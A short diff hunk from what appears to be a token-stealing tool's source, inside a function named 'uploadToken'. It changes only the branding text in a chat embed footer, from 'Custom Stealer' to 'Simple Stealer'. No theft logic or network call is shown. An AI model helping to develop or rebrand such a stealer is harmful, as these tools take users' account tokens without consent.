@@ -223,7 +223,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Custom Stealer",
+                "text": "Simple Stealer",
                 "icon_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif"
                 },
             "thumbnail": {
